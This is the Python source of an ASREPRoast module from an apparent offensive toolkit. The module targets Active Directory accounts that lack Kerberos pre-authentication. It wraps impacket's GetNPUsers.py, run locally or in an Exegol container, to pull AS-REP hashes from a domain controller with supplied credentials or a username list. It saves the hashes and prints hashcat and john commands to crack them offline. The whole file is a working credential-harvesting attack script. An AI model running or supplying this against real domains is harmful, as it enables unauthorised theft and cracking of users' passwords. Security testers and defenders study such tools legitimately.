"""
ASREPRoasting Module
Target accounts without Kerberos pre-authentication
Supports execution via Exegol container or local tools
"""

import os
from core.module_base import ModuleBase, ModuleType, Platform, find_tool


class ASREPRoast(ModuleBase):
    """
    ASREPRoast attack module
    Targets accounts with "Do not require Kerberos preauthentication" set
    Automatically uses Exegol container if local tools not found
    """

    def __init__(self):
        super().__init__()
        self.name = "asreproast"
        self.description = "ASREPRoast - target accounts without Kerberos preauth"
        self.author = "UwU Toolkit"
        self.module_type = ModuleType.AUXILIARY
        self.platform = Platform.WINDOWS
        self.tags = ["ad", "kerberos", "asreproast", "credential", "attack"]
        self.references = [
            "https://attack.mitre.org/techniques/T1558/004/",
            "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast"
        ]

        # Register options
        self.register_option("RHOSTS", "Domain Controller IP", required=True)
        self.register_option("DOMAIN", "Domain name", required=True)
        self.register_option("USER", "Domain username (optional for authenticated mode)", default="")
        self.register_option("PASS", "Domain password", default="")
        self.register_option("USERLIST", "File with usernames to test (for unauthenticated)", default="")
        self.register_option("OUTPUT", "Output file for hashes", default="asrep_hashes.txt")
        self.register_option("FORMAT", "Hash format: hashcat, john", default="hashcat",
                           choices=["hashcat", "john"])
        self.register_option("EXEGOL_CONTAINER", "Exegol container name (auto-detect if empty)", default="")

    def run(self) -> bool:
        dc_ip = self.get_option("RHOSTS")
        domain = self.get_option("DOMAIN")
        user = self.get_option("USER")
        password = self.get_option("PASS")
        userlist = self.get_option("USERLIST")
        output = self.get_option("OUTPUT")

        self.print_status(f"Target DC: {dc_ip}")
        self.print_status(f"Domain: {domain}")
        self.print_line()

        # Build command
        if user and password:
            # Authenticated - will find all ASREP-roastable users
            auth = f"'{domain}/{user}:{password}'"
            cmd_parts = ["GetNPUsers.py", auth, "-dc-ip", dc_ip, "-request"]
        elif userlist:
            # Unauthenticated with userlist
            auth = f"'{domain}/'"
            cmd_parts = ["GetNPUsers.py", auth, "-dc-ip", dc_ip, "-usersfile", userlist, "-format", "hashcat"]
        else:
            self.print_error("Either provide USER/PASS for authenticated mode, or USERLIST for unauthenticated")
            return False

        cmd = " ".join(cmd_parts)

        # Try local first, fall back to Exegol
        tool_path = find_tool("GetNPUsers.py")
        if tool_path:
            self.print_status("Using local impacket tools")
            if user and password:
                ret, stdout, stderr = self.run_command(
                    [tool_path, f"{domain}/{user}:{password}", "-dc-ip", dc_ip, "-request"],
                    timeout=120
                )
            else:
                ret, stdout, stderr = self.run_command(
                    [tool_path, f"{domain}/", "-dc-ip", dc_ip, "-usersfile", userlist, "-format", "hashcat"],
                    timeout=120
                )
        else:
            self.print_status("Using Exegol container for impacket tools")
            ret, stdout, stderr = self.run_in_exegol(cmd, timeout=120)

        # Process output
        output_text = stdout + stderr
        hashes_found = []

        for line in output_text.split('\n'):
            if line.strip():
                if '$krb5asrep$' in line:
                    hashes_found.append(line.strip())
                    self.print_good(f"Got AS-REP hash!")
                elif 'Name' in line and 'MemberOf' in line:
                    self.print_line(line)
                elif '---' in line:
                    self.print_line(line)
                elif line.strip().startswith(('-', '[')):
                    if '[-]' in line:
                        self.print_error(line)
                    elif '[+]' in line:
                        self.print_good(line)
                    elif '[*]' in line:
                        self.print_status(line.replace('[*]', '').strip())
                elif 'No entries found' in line:
                    self.print_warning("No ASREPRoastable users found")

        # Save hashes
        if hashes_found:
            try:
                output_path = os.path.abspath(output)
                with open(output_path, 'w') as f:
                    f.write('\n'.join(hashes_found))
                self.print_good(f"Saved {len(hashes_found)} hash(es) to: {output_path}")
                self.print_status(f"Crack with: hashcat -m 18200 {output} wordlist.txt")
                self.print_status(f"        or: john --format=krb5asrep {output} --wordlist=wordlist.txt")
            except Exception as e:
                self.print_warning(f"Could not save to file: {e}")
                self.print_line()
                self.print_status("Hashes:")
                for h in hashes_found:
                    self.print_line(h)

            return True
        else:
            self.print_warning("No ASREPRoastable users found or no hashes retrieved")
            return "No entries found" not in output_text  # Return True if not an error

    def check(self) -> bool:
        """Check if tools are available locally or via Exegol"""
        if find_tool("GetNPUsers.py"):
            return True
        # Check Exegol
        ret, stdout, stderr = self.run_in_exegol("which GetNPUsers.py", timeout=10)
        return ret == 0
